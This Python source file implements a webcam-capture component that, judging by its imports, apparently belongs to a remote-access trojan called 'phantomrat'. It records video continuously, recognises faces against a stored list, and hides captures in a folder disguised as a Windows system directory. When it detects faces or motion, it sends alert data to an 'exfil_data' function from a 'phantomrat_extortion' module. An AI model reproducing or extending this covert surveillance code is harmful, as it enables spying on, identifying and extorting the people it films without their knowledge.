import cv2
import numpy as np
import base64
import io
import time
import threading
import json
import os
from datetime import datetime
from cryptography.fernet import Fernet
import queue
import logging
from PIL import Image
import face_recognition

logger = logging.getLogger(__name__)

class EnhancedWebcam:
    """
    Enhanced webcam capture with face detection, motion detection, and AI analysis
    """
    
    def __init__(self, encryption_key=None):
        self.encryption_key = encryption_key
        self.is_recording = False
        self.capture_thread = None
        self.frame_queue = queue.Queue(maxsize=30)
        self.detected_faces = []
        self.motion_history = []
        self.known_faces = []  # Load known faces for recognition
        self.known_names = []
        
        # AI Model parameters
        self.face_detection_enabled = True
        self.motion_detection_enabled = True
        self.emotion_detection_enabled = False  # Would require additional model
        
        # Recording settings
        self.default_duration = 10  # seconds
        self.max_duration = 300  # 5 minutes
        self.frame_rate = 15  # FPS
        self.resolution = (640, 480)  # Default resolution
        
        # Storage
        self.storage_path = self._get_storage_path()
        os.makedirs(self.storage_path, exist_ok=True)
        
        # Load known faces if available
        self._load_known_faces()
        
        # Initialize encryption
        self.fernet = None
        if encryption_key:
            try:
                if isinstance(encryption_key, bytes):
                    self.fernet = Fernet(encryption_key)
                else:
                    key = encryption_key.encode().ljust(32)[:32]
                    self.fernet = Fernet(base64.urlsafe_b64encode(key))
            except:
                logger.warning("Failed to initialize encryption")
    
    def _get_storage_path(self):
        """Get storage path for webcam captures"""
        if os.name == 'nt':  # Windows
            path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Webcam')
        else:  # Linux/macOS
            path = os.path.join(os.path.expanduser('~'), '.local', 'share', 'webcam')
        
        os.makedirs(path, exist_ok=True)
        return path
    
    def _load_known_faces(self):
        """Load known faces from file if available"""
        known_faces_file = os.path.join(self.storage_path, 'known_faces.json')
        if os.path.exists(known_faces_file):
            try:
                with open(known_faces_file, 'r') as f:
                    data = json.load(f)
                    self.known_faces = [np.array(face) for face in data.get('faces', [])]
                    self.known_names = data.get('names', [])
                    logger.info(f"Loaded {len(self.known_faces)} known faces")
            except:
                pass
    
    def _save_known_faces(self):
        """Save known faces to file"""
        try:
            known_faces_file = os.path.join(self.storage_path, 'known_faces.json')
            data = {
                'faces': [face.tolist() for face in self.known_faces],
                'names': self.known_names,
                'updated': datetime.now().isoformat()
            }
            with open(known_faces_file, 'w') as f:
                json.dump(data, f)
        except:
            pass
    
    def add_known_face(self, face_image, name):
        """Add a known face for recognition"""
        try:
            # Convert to RGB
            rgb_image = cv2.cvtColor(face_image, cv2.COLOR_BGR2RGB)
            
            # Get face encoding
            encodings = face_recognition.face_encodings(rgb_image)
            if encodings:
                self.known_faces.append(encodings[0])
                self.known_names.append(name)
                self._save_known_faces()
                return True
        except:
            pass
        return False
    
    def capture_webcam(self, duration=None, save_local=True, detect_faces=True):
        """
        Capture webcam footage with optional face detection
        """
        if duration is None:
            duration = self.default_duration
        duration = min(duration, self.max_duration)
        
        try:
            # Open webcam
            cap = cv2.VideoCapture(0)
            
            if not cap.isOpened():
                logger.error("Could not open webcam")
                return None
            
            # Set resolution
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, self.resolution[0])
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, self.resolution[1])
            
            frames = []
            timestamps = []
            face_data = []
            motion_events = []
            
            start_time = time.time()
            frame_count = 0
            
            # Motion detection variables
            prev_frame = None
            motion_threshold = 1000
            
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if not ret:
                    break
                
                timestamp = datetime.now()
                frame_count += 1
                
                # Process frame
                processed_frame = frame.copy()
                frame_info = {
                    'timestamp': timestamp.isoformat(),
                    'frame_number': frame_count,
                    'has_face': False,
                    'has_motion': False,
                    'recognized_faces': []
                }
                
                # Face detection
                if detect_faces and self.face_detection_enabled:
                    face_results = self.detect_faces(frame)
                    if face_results['faces']:
                        frame_info['has_face'] = True
                        frame_info['faces'] = face_results['faces']
                        
                        # Draw bounding boxes
                        for face in face_results['faces']:
                            x, y, w, h = face['bbox']
                            cv2.rectangle(processed_frame, (x, y), (x+w, y+h), (0, 255, 0), 2)
                            
                            # Add label if recognized
                            if face.get('name'):
                                cv2.putText(processed_frame, face['name'], (x, y-10),
                                          cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2)
                        
                        face_data.append(frame_info)
                
                # Motion detection
                if self.motion_detection_enabled:
                    motion_result = self.detect_motion(frame, prev_frame)
                    if motion_result['has_motion']:
                        frame_info['has_motion'] = True
                        frame_info['motion_score'] = motion_result['score']
                        
                        # Draw motion contour
                        if motion_result.get('contour') is not None:
                            cv2.drawContours(processed_frame, [motion_result['contour']], -1, (0, 0, 255), 2)
                        
                        motion_events.append(frame_info)
                    
                    prev_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                
                # Store frame
                if save_local:
                    # Convert to JPEG
                    _, buffer = cv2.imencode('.jpg', processed_frame, 
                                           [cv2.IMWRITE_JPEG_QUALITY, 85])
                    
                    # Encrypt if enabled
                    if self.fernet:
                        encrypted = self.fernet.encrypt(buffer.tobytes())
                        frames.append(base64.b64encode(encrypted).decode())
                    else:
                        frames.append(base64.b64encode(buffer).decode())
                else:
                    frames.append(processed_frame)
                
                timestamps.append(timestamp)
                
                # Control frame rate
                time.sleep(1.0 / self.frame_rate)
            
            cap.release()
            
            # Prepare result
            result = {
                'frames': frames if save_local else len(frames),
                'timestamps': [ts.isoformat() for ts in timestamps],
                'duration': time.time() - start_time,
                'frame_rate': frame_count / duration if duration > 0 else 0,
                'resolution': self.resolution,
                'face_detections': len(face_data),
                'motion_events': len(motion_events),
                'sample_faces': face_data[:3] if face_data else [],
                'sample_motion': motion_events[:3] if motion_events else []
            }
            
            # Save locally if requested
            if save_local and frames:
                self._save_capture(result, 'webcam_capture')
            
            return result
            
        except Exception as e:
            logger.error(f"Webcam capture error: {e}")
            return None
    
    def detect_faces(self, frame):
        """
        Detect faces in frame using Haar cascades and face_recognition
        """
        results = {
            'faces': [],
            'count': 0,
            'recognized': 0
        }
        
        try:
            # Convert to RGB for face_recognition
            rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            
            # Method 1: face_recognition (more accurate)
            face_locations = face_recognition.face_locations(rgb_frame)
            face_encodings = face_recognition.face_encodings(rgb_frame, face_locations)
            
            for (top, right, bottom, left), face_encoding in zip(face_locations, face_encodings):
                face_info = {
                    'bbox': [left, top, right-left, bottom-top],
                    'confidence': 1.0,
                    'encoding': face_encoding.tolist() if self.fernet else None
                }
                
                # Face recognition if we have known faces
                if self.known_faces:
                    matches = face_recognition.compare_faces(self.known_faces, face_encoding, tolerance=0.6)
                    if True in matches:
                        match_index = matches.index(True)
                        face_info['name'] = self.known_names[match_index]
                        face_info['recognized'] = True
                        results['recognized'] += 1
                
                results['faces'].append(face_info)
            
            results['count'] = len(results['faces'])
            
            # Fallback: Haar cascades if face_recognition finds nothing
            if results['count'] == 0:
                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                face_cascade = cv2.CascadeClassifier(
                    cv2.data.haarcascades + 'haarcascade_frontalface_default.xml'
                )
                
                faces = face_cascade.detectMultiScale(
                    gray,
                    scaleFactor=1.1,
                    minNeighbors=5,
                    minSize=(30, 30)
                )
                
                for (x, y, w, h) in faces:
                    face_info = {
                        'bbox': [x, y, w, h],
                        'confidence': 0.8,
                        'method': 'haar'
                    }
                    results['faces'].append(face_info)
                
                results['count'] = len(results['faces'])
            
        except Exception as e:
            logger.error(f"Face detection error: {e}")
        
        return results
    
    def detect_motion(self, current_frame, previous_frame):
        """
        Detect motion between frames
        """
        result = {
            'has_motion': False,
            'score': 0,
            'contour': None
        }
        
        if previous_frame is None:
            return result
        
        try:
            # Convert to grayscale
            gray_current = cv2.cvtColor(current_frame, cv2.COLOR_BGR2GRAY)
            gray_previous = previous_frame
            
            # Compute absolute difference
            diff = cv2.absdiff(gray_current, gray_previous)
            
            # Apply threshold
            _, thresh = cv2.threshold(diff, 25, 255, cv2.THRESH_BINARY)
            
            # Dilate to fill holes
            thresh = cv2.dilate(thresh, None, iterations=2)
            
            # Find contours
            contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
            
            # Check for significant motion
            motion_score = 0
            largest_contour = None
            max_area = 0
            
            for contour in contours:
                area = cv2.contourArea(contour)
                motion_score += area
                
                if area > max_area and area > 500:  # Minimum area threshold
                    max_area = area
                    largest_contour = contour
            
            result['score'] = motion_score
            result['contour'] = largest_contour
            
            if motion_score > 1000:  # Motion threshold
                result['has_motion'] = True
        
        except Exception as e:
            logger.error(f"Motion detection error: {e}")
        
        return result
    
    def _save_capture(self, capture_data, prefix='webcam'):
        """Save capture data locally"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{prefix}_{timestamp}.json"
            filepath = os.path.join(self.storage_path, filename)
            
            # Compress frames if too many
            if 'frames' in capture_data and len(capture_data['frames']) > 50:
                # Keep only first and last 25 frames
                frames = capture_data['frames']
                if len(frames) > 50:
                    capture_data['frames'] = frames[:25] + frames[-25:]
                    capture_data['frames_compressed'] = True
            
            with open(filepath, 'w') as f:
                json.dump(capture_data, f, indent=2)
            
            logger.info(f"Saved webcam capture to {filepath}")
            return filepath
            
        except Exception as e:
            logger.error(f"Error saving capture: {e}")
            return None
    
    def start_continuous_capture(self, callback=None, interval=30):
        """
        Start continuous webcam monitoring
        """
        def capture_loop():
            self.is_recording = True
            
            while self.is_recording:
                try:
                    # Capture for specified interval
                    result = self.capture_webcam(
                        duration=interval,
                        save_local=True,
                        detect_faces=True
                    )
                    
                    if result and callback:
                        callback(result)
                    
                    # Check for significant events
                    if result and (result['face_detections'] > 0 or result['motion_events'] > 0):
                        self._handle_special_event(result)
                    
                    # Sleep before next capture
                    time.sleep(5)  # Short pause between captures
                    
                except Exception as e:
                    logger.error(f"Continuous capture error: {e}")
                    time.sleep(10)
        
        self.capture_thread = threading.Thread(target=capture_loop, daemon=True)
        self.capture_thread.start()
        logger.info(f"Started continuous webcam monitoring (interval: {interval}s)")
    
    def _handle_special_event(self, capture_data):
        """Handle special events (faces detected, motion)"""
        try:
            # Prepare alert data
            alert_data = {
                'type': 'webcam_alert',
                'timestamp': datetime.now().isoformat(),
                'faces_detected': capture_data.get('face_detections', 0),
                'motion_events': capture_data.get('motion_events', 0),
                'sample_faces': capture_data.get('sample_faces', []),
                'resolution': capture_data.get('resolution'),
                'duration': capture_data.get('duration', 0)
            }
            
            # Send alert via exfiltration
            from phantomrat_extortion import exfil_data
            exfil_data(alert_data)
            
            # Save detailed capture
            self._save_capture(capture_data, 'webcam_alert')
            
            logger.info(f"Webcam alert: {alert_data['faces_detected']} faces, {alert_data['motion_events']} motion events")
            
        except Exception as e:
            logger.error(f"Error handling special event: {e}")
    
    def stop_continuous_capture(self):
        """Stop continuous capture"""
        self.is_recording = False
        if self.capture_thread:
            self.capture_thread.join(timeout=5)
        logger.info("Stopped continuous webcam monitoring")
    
    def get_storage_info(self):
        """Get information about stored captures"""
        try:
            files = [f for f in os.listdir(self.storage_path) if f.endswith('.json')]
            total_size = sum(os.path.getsize(os.path.join(self.storage_path, f)) for f in files)
            
            return {
                'total_files': len(files),
                'total_size_mb': total_size / (1024 * 1024),
                'oldest_file': min(files) if files else None,
                'newest_file': max(files) if files else None
            }
        except:
            return {}
    
    def cleanup_old_captures(self, max_age_days=7, max_total_mb=100):
        """Cleanup old capture files"""
        try:
            files = []
            for f in os.listdir(self.storage_path):
                if f.endswith('.json'):
                    filepath = os.path.join(self.storage_path, f)
                    mtime = os.path.getmtime(filepath)
                    size = os.path.getsize(filepath)
                    files.append((filepath, mtime, size))
            
            # Sort by modification time (oldest first)
            files.sort(key=lambda x: x[1])
            
            total_size = sum(f[2] for f in files)
            cutoff_time = time.time() - (max_age_days * 24 * 3600)
            
            deleted = 0
            deleted_size = 0
            
            for filepath, mtime, size in files:
                # Delete if too old or if total size exceeds limit
                if mtime < cutoff_time or total_size - deleted_size > max_total_mb * 1024 * 1024:
                    os.remove(filepath)
                    deleted += 1
                    deleted_size += size
            
            if deleted > 0:
                logger.info(f"Cleaned up {deleted} old capture files ({deleted_size/(1024*1024):.1f} MB)")
            
            return deleted
            
        except Exception as e:
            logger.error(f"Error cleaning up captures: {e}")
            return 0

def capture_webcam(duration=10, detect_faces=True):
    """
    Main function to capture webcam
    """
    try:
        # Load encryption key from profile
        encryption_key = None
        try:
            with open('malleable_profile.json', 'r') as f:
                profile = json.load(f)
                key_str = profile['encryption']['key']
                if len(key_str) < 32:
                    key_str = key_str.ljust(32)[:32]
                encryption_key = key_str.encode()
        except:
            pass
        
        webcam = EnhancedWebcam(encryption_key=encryption_key)
        result = webcam.capture_webcam(duration=duration, detect_faces=detect_faces)
        
        if result:
            logger.info(f"Webcam capture successful: {result.get('face_detections', 0)} faces detected")
            return result
        else:
            logger.error("Webcam capture failed")
            return None
            
    except Exception as e:
        logger.error(f"Webcam capture error: {e}")
        return None

if __name__ == "__main__":
    # Test webcam capture
    print("Testing Enhanced Webcam Capture...")
    
    # Set up logging
    logging.basicConfig(level=logging.INFO)
    
    # Test capture
    result = capture_webcam(duration=5, detect_faces=True)
    
    if result:
        print(f"\nCapture successful!")
        print(f"Duration: {result.get('duration', 0):.1f} seconds")
        print(f"Frames: {result.get('frames', 0)}")
        print(f"Faces detected: {result.get('face_detections', 0)}")
        print(f"Motion events: {result.get('motion_events', 0)}")
        
        if result.get('sample_faces'):
            print(f"\nSample face detections:")
            for face in result['sample_faces'][:2]:
                print(f"  Frame {face.get('frame_number')}: {len(face.get('faces', []))} faces")
    else:
        print("Webcam capture failed")

